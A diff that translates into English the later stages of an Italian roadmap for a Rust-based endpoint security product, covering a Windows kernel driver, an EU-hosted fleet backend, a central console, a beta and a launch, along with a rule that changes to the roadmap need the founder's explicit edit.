-Decisione gate: prima di iniziare questa tappa, audit della maturità
-di windows-drivers-rs. Se non production-ready, si rimanda e si
-passa alla Tappa 13.
+Demo: the same ransomware test as Tappa 5, run on Windows.
+The same response: kill + isolation.
 
 ---
 
-## Tappa 13 — Backend C2 EU sovrano
+## Tappa 12 — Windows kernel driver (when mature)
 
-Obiettivo: flotta multi-agent coordinata, EU-sovereign.
+Goal: kernel-grade anti-tamper on Windows.
+
+- Assessment of windows-drivers-rs maturity (today it is in preview)
+- If still in preview → we keep user-mode ETW + WDAC hardening as an
+  alternative
+- If production-ready → minifilter + ObCallbacks in no_std Rust
+- Microsoft driver signing (€€€) and WHQL submission
+
+Gate decision: before starting this Tappa, an audit of the maturity
+of windows-drivers-rs. If it is not production-ready, it is postponed and
+we move on to Tappa 13.
+
+---
+
+## Tappa 13 — Sovereign EU C2 backend
+
+Goal: a coordinated multi-agent fleet, EU-sovereign.
 
 - Server in Rust (Axum)
-- mTLS via rustls
-- NATS JetStream per ingestion eventi
-- ClickHouse per cold storage
-- VictoriaMetrics per metriche
-- Storage object: Garage (sovereignty tier)
-- Deployable on-prem o cloud EU only
-- Watchdog esterno all'host (revisione del 10 ottobre 2026): heartbeat
-  firmato dall'agent con versione, hash dei programmi BPF, stato di
-  bpffs e, dove c'è TPM, quote dei PCR; il backend distingue heartbeat
-  mancante, firma invalida, baseline BPF divergente e PCR divergenti, e
-  mette in quarantena l'host; chain log inoltrati append-only perché i
-  log locali non bastano contro root
+- mTLS through rustls
+- NATS JetStream for event ingestion
+- ClickHouse for cold storage
+- VictoriaMetrics for metrics
+- Object storage: Garage (sovereignty tier)
+- Deployable on-prem or on EU-only cloud
+- A watchdog outside the host (review of 10 October 2026): a heartbeat
+  signed by the agent with its version, the hashes of the BPF programs, the
+  state of bpffs and, where there is a TPM, PCR quotes; the backend tells
+  apart a missing heartbeat, an invalid signature, a diverging BPF baseline
+  and diverging PCRs, and quarantines the host; chain logs forwarded
+  append-only, because local logs are not enough against root
 
-Demo: 3 agent (2 Linux + 1 Windows) connessi al C2. Dashboard
-mostra flotta in tempo reale.
-
----
-
-## Tappa 14 — Console centrale (fleet management)
-
-Obiettivo: admin gestisce la flotta da un'unica UI.
-
-- Estensione della UI di Tappa 9 in modalità "console centrale"
-- Lista host, alert aggregati, override livelli autonomia per host
-- Key Vault management per recovery delle chiavi
-- Reporting compliance (NIS2, ISO 27001, GDPR)
-
-Demo: console mostra 50 host simulati, alert filtrabili per host,
-azione di massa "isola tutti gli host con verdict=High".
+Demo: 3 agents (2 Linux + 1 Windows) connected to the C2. A dashboard
+shows the fleet in real time.
 
 ---
 
-## Tappa 15 — Hardening avanzato selettivo (da v3 di Gemini)
+## Tappa 14 — Central console (fleet management)
 
-Obiettivo: innesti delle feature avanzate dove hanno ROI massimo.
+Goal: the admin manages the fleet from a single UI.
 
-Candidati emersi dalla revisione esterna del 10 ottobre 2026 (funzioni
-da prodotto maturo, non difetti del nucleo): enforcement di rete per
-flusso con TC/XDP o `cgroup/connect` (policy per uid, cgroup, container
-e destinazione, non solo kill del processo); reputazione dei binari,
-similarity e regole YARA; esposizione alle vulnerabilità (CVE dei
-pacchetti collegate alla telemetria runtime); chiavi admin e dell'agent
-protette da TPM con attestazione dell'host; integrazione SIEM, syslog e
-OpenTelemetry; "SBOM a runtime" (inventario dei binari eseguiti con hash
-e provenienza).
+- Extension of the Tappa 9 UI in "central console" mode
+- Host list, aggregated alerts, autonomy level overrides per host
+- Key Vault management for key recovery
+- Compliance reporting (NIS2, ISO 27001, GDPR)
 
-Selezione a quel punto in base a:
-- Threat landscape attuale
-- Feedback beta clienti
-- Maturità delle tecnologie scelte
+Demo: the console shows 50 simulated hosts, alerts filterable by host,
+a bulk action "isolate all hosts with verdict=High".
 
-Candidati (in VISION_TECHNICAL.md per dettaglio):
-- Honeypots locali (deception layer)
+---
+
+## Tappa 15 — Selective advanced hardening (from Gemini's v3)
+
+Goal: graft the advanced features where they have the highest ROI.
+
+Candidates from the external review of 10 October 2026 (features
+of a mature product, not defects of the core): per-flow network enforcement
+with TC/XDP or `cgroup/connect` (policy by uid, cgroup, container
+and destination, not only killing the process); binary reputation,
+similarity and YARA rules; vulnerability exposure (package CVEs
+linked to runtime telemetry); admin and agent keys
+protected by a TPM with host attestation; SIEM, syslog and
+OpenTelemetry integration; a "runtime SBOM" (an inventory of the binaries run, with hash
+and provenance).
+
+Selection at that point based on:
+- The current threat landscape
+- Feedback from beta customers
+- Maturity of the chosen technologies
+
+Candidates (see VISION_TECHNICAL.md for details):
+- Local honeypots (deception layer)
 - JA4 fingerprinting
-- Anti-BYOVD (driver blocklist Windows)
-- IOMMU enforcement Linux
-- Patching virtuale via eBPF
+- Anti-BYOVD (Windows driver blocklist)
+- Linux IOMMU enforcement
+- Virtual patching through eBPF
 
 ---
 
-## Tappa 16 — Beta privata
+## Tappa 16 — Private beta
 
-Obiettivo: validazione su 5-10 organizzazioni vere.
+Goal: validation with 5-10 real organisations.
 
-- Recruitment beta tester (PMI italiane, EU)
-- Onboarding assistito
-- Feedback loop settimanale
-- Bug fix + iterazione
+- Recruiting beta testers (Italian SMEs, EU)
+- Assisted onboarding
+- Weekly feedback loop
+- Bug fixes + iteration
 
 ---
 
-## Tappa 17 — Lancio pubblico
+## Tappa 17 — Public launch
 
-Obiettivo: NorthNarrow disponibile commercialmente.
+Goal: NorthNarrow commercially available.
 
-- Sito, pricing, sales funnel
-- Documentation completa
-- Compliance certifications avviate (NIS2 readiness, eIDAS where applicable)
+- Website, pricing, sales funnel
+- Complete documentation
+- Compliance certifications started (NIS2 readiness, eIDAS where applicable)
 - Customer success
-- Lancio comunicato
+- Launch announcement
 
 ---
 
-## Regola d'oro
+## Golden rule
 
-Una tappa alla volta. Non si salta. Non si torna indietro.
-Quando una tappa è chiusa e testata, si passa alla prossima.
-Se Claude (qualsiasi versione) prova a cambiare ordine senza che il
-founder lo richieda esplicitamente, ha torto Claude.
+One Tappa at a time. None is skipped. There is no going back.
+When a Tappa is closed and tested, we move on to the next one.
+If Claude (any version) tries to change the order without the
+founder explicitly asking for it, Claude is wrong.
 
-Modifiche a questa roadmap richiedono modifica esplicita del file da
-parte del founder. Non si modifica per consenso conversazionale.
+Changes to this roadmap need an explicit change to the file by
+the founder. It is not changed by agreement in a conversation.
 
-Aggiornamento del 9 ottobre 2026 richiesto esplicitamente dal founder:
-le Tappe 9 → 10.7 riflettono il lavoro eseguito (FIM, deception, rete,
-regole, profondità, avversariale), la 10.8 raccoglie il lavoro
-trasversale di affidabilità; "UI locale" e "Scout proattivo" restano in
-roadmap, slittate dopo la 10.8, con numerazione definitiva da assegnare
-dal founder.
+Update of 9 October 2026, explicitly requested by the founder:
+Tappe 9 → 10.7 reflect the work done (FIM, deception, network,
+rules, depth, adversarial), and 10.8 gathers the cross-cutting
+reliability work; "Local UI" and "Proactive Scout" stay in the
+roadmap, moved after 10.8, with their final numbering to be assigned
+by the founder.
 
-Aggiornamento del 20 ottobre 2026 su decisione del founder (Wave 4, lab PR
-214): rimosso il consulente LLM on-host (Tappa 6 tranne la 6.5); vedi la
-decisione di prodotto in testa al file.
+Update of 20 October 2026, on the founder's decision (Wave 4, lab PR
+214): the on-host LLM advisor was removed (Tappa 6 except 6.5); see the
+product decision at the top of the file.
